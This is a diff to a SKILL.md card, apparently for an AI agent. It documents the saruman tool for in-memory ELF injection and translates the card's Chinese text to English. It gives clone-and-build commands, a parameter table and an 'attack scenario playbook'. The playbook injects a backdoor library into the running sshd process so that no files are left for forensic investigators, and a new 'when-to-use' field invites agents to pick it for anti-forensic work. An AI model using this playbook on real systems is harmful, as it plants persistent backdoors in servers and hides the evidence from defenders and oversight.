@@ -2,36 +2,39 @@
 name: saruman-anti-forensic
 description: "saruman: Injects ELF into memory to evade disk forensics. Signals: trace cleanup, anti-forensics, attach mode, cleanup traces on exit."
 zh-signals: "saruman: ELF 内存注入规避磁盘取证。信号:痕迹清理,反取证,附加模式,退出时清理痕迹。"
+when-to-use: >-
+  Use for anti-forensic scenarios that require in-memory ELF injection into a
+  running process to avoid leaving disk artifacts.
 ---
 
 # saruman
 
-- 攻击大类:C20 反取证与痕迹清理
-- 上游仓库:https://github.com/elfmaster/saruman
-- 上游 License:GPL-2.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C20 Anti-Forensics and Trace Cleanup
+- Upstream Repository: https://github.com/elfmaster/saruman
+- Upstream License: GPL-2.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
 git clone https://github.com/elfmaster/saruman && cd saruman && make
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 命令 | 说明 |
+| Parameter / Command | Description |
 | --- | --- |
-| `./saruman target_bin payload.so` | 将 ELF 动态注入目标进程内存 |
-| `-p pid` | 附加模式 |
-| `--clean` | 退出时清理痕迹 |
+| `./saruman target_bin payload.so` | Dynamically inject the ELF into the target process memory |
+| `-p pid` | Attach mode |
+| `--clean` | Clean up traces on exit |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### ELF 内存注入规避磁盘取证
+### ELF memory injection to evade disk forensics
 
 ```bash
-./saruman /usr/sbin/sshd ./backdoor.so  # 注入后目标进程内执行,不留磁盘文件
+./saruman /usr/sbin/sshd ./backdoor.so  # Executes in the target process after injection, leaving no file on disk
 ```
 
-## 注意事项
+## Notes
 
-PoC 级工具,现代内核 hardening(ptrace_scope/SELinux)下多需降防护,研究价值大于实战。
+PoC-grade tool; modern kernel hardening (ptrace_scope/SELinux) usually requires weakening protections, so it is more valuable for research than for live engagements.
